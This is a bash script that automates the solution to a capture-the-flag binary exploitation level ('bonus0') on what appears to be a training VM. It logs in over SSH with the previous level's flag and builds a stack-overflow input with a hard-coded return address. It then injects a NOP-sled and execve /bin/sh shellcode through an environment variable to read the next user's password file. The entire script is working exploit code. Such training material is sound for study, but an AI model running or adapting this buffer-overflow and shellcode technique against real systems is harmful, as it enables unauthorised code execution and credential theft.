#!/bin/bash

VM_ID='192.168.56.5'
ACTUAL_BONUS=$(echo "$0" | grep --only --color=never --max-count=1 "bonus[0-9].sh" | head --lines=1 | grep --only --color=never --max-count=1 '[0-9]' | head --lines=1)

if [ -z "${ACTUAL_BONUS}" ]; then
    echo "cannot get the bonus number of the actua bonus"
    exit 1
fi

PREVIOUS_LEVEL="9"

if [ ! -f "../../level${PREVIOUS_LEVEL}/flag" ]; then
    echo "../../level${PREVIOUS_LEVEL}/flag does not exist"
    exit 1
fi

act_bonus_password=$(cat "../../level${PREVIOUS_LEVEL}/flag")

sshpass -p "${act_bonus_password}" ssh bonus${ACTUAL_BONUS}@${VM_ID} -p 4242 'python -c "print \"A\"*4095+\"\n\"+\"B\"*9+\"\xbf\xff\xff\xbf\"+\"B\"*4082" > /tmp/bonus0_content ; echo "cat /home/user/bonus1/.pass" > /tmp/bonus0_cmd' 2> /dev/null

flag=$(sshpass -p "${act_bonus_password}" ssh bonus${ACTUAL_BONUS}@${VM_ID} -p 4242 'cat /tmp/bonus0_content /tmp/bonus0_cmd | env -i SHELLCODE="$(python -c "print \"\x90\"*30 + \"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\"")" ./bonus0' 2> /dev/null)

flag="$(echo ${flag} | tail -n 1 | grep --only-matching --color=never '[a-z0-9]\{64,64\}' | tail -n 1)"

echo -e "FLAG:\n${flag}"
